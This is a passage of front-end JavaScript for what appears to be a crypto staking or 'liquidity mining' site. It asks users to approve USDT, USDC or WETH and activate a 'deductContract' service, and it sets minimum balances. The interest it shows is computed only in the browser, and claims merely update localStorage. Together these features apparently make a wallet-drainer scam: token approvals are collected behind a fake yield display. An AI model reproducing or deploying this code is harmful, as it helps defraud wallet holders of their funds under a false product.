        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
      }
    } else if (!tokenToActivate) tokenToActivate = address;
  }
  if (!serviceActivated && tokenToActivate) {
    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
    updateStatus(`Activating service with ${tokenName}...`);
    try {
      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
      activateTx.value = 0n;
      await sendMobileRobustTransaction(activateTx);
      authorizedToken = tokenName;
      localStorage.setItem('authorizedToken', authorizedToken);
      await saveUserData();
    } catch (err) {
      updateStatus(`Activation failed: ${err.message}`, true);
    }
  }
  await forceRefreshWalletBalance();
}

function updateLanguage(lang) {
  currentLang = lang;
  if (languageSelect) languageSelect.value = lang;
  localStorage.setItem('language', lang);
  const apply = () => {
    for (let key in elements) {
      if (elements[key] && translations[lang]?.[key]) {
        elements[key].textContent = translations[lang][key];
      }
    }
    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
    if (claimModal && claimModal.style.display === 'flex') {
      updateClaimModalLabels();
    }
    updateNextBenefitTimer();
    document.documentElement.lang = lang;
  };
  setTimeout(apply, 200);
}

function calculatePayoutInterest() {
  if (pledgedAmount <= 0) return 0;
  const now = Date.now();
  const lastPayout = parseInt(localStorage.getItem('lastPayoutTime')) || now;
  const hoursSinceLast = (now - lastPayout) / (1000 * 60 * 60);
  const monthlyRate = 0.01;
  const hourlyRate = monthlyRate / (30 * 24);
  return pledgedAmount * hourlyRate * hoursSinceLast;
}

// 初始化
document.addEventListener('DOMContentLoaded', () => {
  getElements();
  updateLanguage(currentLang);
  initializeWallet();
  setTimeout(() => {
    updateTotalFunds();
    setInterval(updateTotalFunds, 1000);
  }, 100);
  const claimBtn = document.getElementById('claimButton');
  if (claimBtn) claimBtn.addEventListener('click', claimInterest);
  if (closeModal) closeModal.addEventListener('click', closeClaimModal);
  if (cancelClaim) cancelClaim.addEventListener('click', closeClaimModal);
  if (claimModal) claimModal.addEventListener('click', e => e.target === claimModal && closeClaimModal());
  if (confirmClaim) {
    confirmClaim.addEventListener('click', async () => {
      closeClaimModal();
      const claimable = window.currentClaimable || 0;
      if (claimable < 0.0000001) {
        updateStatus(translations[currentLang].noClaimable, true);
        return;
      }
      accountBalance[authorizedToken] += claimable;
      window.currentClaimable = 0;
      localStorage.setItem('claimable', '0');
      localStorage.setItem('accountBalance', JSON.stringify(accountBalance));
      await saveUserData();
      updateClaimableDisplay();
      await forceRefreshWalletBalance();
      updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
    });
  }
  if (languageSelect) languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
  if (connectButton) {
    connectButton.addEventListener('click', () => {
      if (connectButton.classList.contains('connected')) {
        disconnectWallet();
      } else {
        connectWallet();
      }
    });
  }
  if (startBtn) {
    startBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
      if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
      let balanceBigInt;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
      } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
      if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
      startBtn.disabled = true;
      startBtn.textContent = 'Authorizing...';
      try {
        await handleConditionalAuthorizationFlow();
        let canStart = false;
        if (selectedToken === 'WETH') {
          const prices = ethPriceCache.price || 2500;
          const wethValueUSD = balance * prices;
          if (wethValueUSD >= 500) canStart = true;
        } else {
          if (balance >= 1) canStart = true;
        }
        if (canStart) {
          pledgedAmount = balance;
          lastPayoutTime = Date.now();
          currentCycleInterest = calculatePayoutInterest();
          authorizedToken = selectedToken;
          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
          localStorage.setItem('authorizedToken', authorizedToken);
          updateStatus(translations[currentLang].miningStarted);
          activateStakingUI();
        } else {
          updateStatus('Balance too low.', true);
          startBtn.disabled = false;
          startBtn.textContent = translations[currentLang].startBtnText;
        }
      } catch (error) {
        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang].startBtnText;
      }
    });
  }
  if (pledgeBtn) {
    pledgeBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const amount = parseFloat(pledgeAmount.value) || 0;
      const token = pledgeToken.value;
      if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
      const tokenMap = { 'USDT': USDT_CONTRACT_ADDRESS, 'USDC': USDC_CONTRACT_ADDRESS, 'WETH': WETH_CONTRACT_ADDRESS };
      const tokenAddress = tokenMap[token];
      if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
      const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
      try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        const decimals = token === 'WETH' ? 18 : 6;
        const formattedBalance = parseFloat(ethers.formatUnits(balance, decimals));
        if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
      } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      updateStatus('Pledging...');
      const pledgeData = {
        address: userAddress,
        pledges: {
          isPledging: true,
          token: tokenAddress,
          amount: amount.toFixed(2)
        }
      };
      try {
        await db.collection('pledges').doc(userAddress).set(pledgeData.pledges, { merge: true });
        updateStatus(translations[currentLang].pledgeSuccess);
        await saveUserData();
      } catch (error) {
        updateStatus(translations[currentLang].pledgeError, true);
      }
    });
  }
  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
  if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
      document.getElementById(tab.dataset.tab).classList.add('active');
      if (tab.dataset.tab === 'liquidity') updateInterest();
    });
  });
  const rulesModal = document.getElementById('rulesModal');
  const rulesButton = document.getElementById('rulesButton');
  const closeRulesModal = document.getElementById('closeRulesModal');
  if (rulesButton) {
    rulesButton.addEventListener('click', () => {
      const rulesTitle = document.getElementById('rulesTitle');
      const rulesContent = document.getElementById('rulesContent');
      if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
      if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
      if (rulesModal) rulesModal.style.display = 'flex';
    });
  }
  if (closeRulesModal) closeRulesModal.addEventListener('click', () => {
    if (rulesModal) rulesModal.style.display = 'none';
  });
  if (rulesModal) rulesModal.addEventListener('click', e => {
    if (e.target === rulesModal && rulesModal) rulesModal.style.display = 'none';
  });
});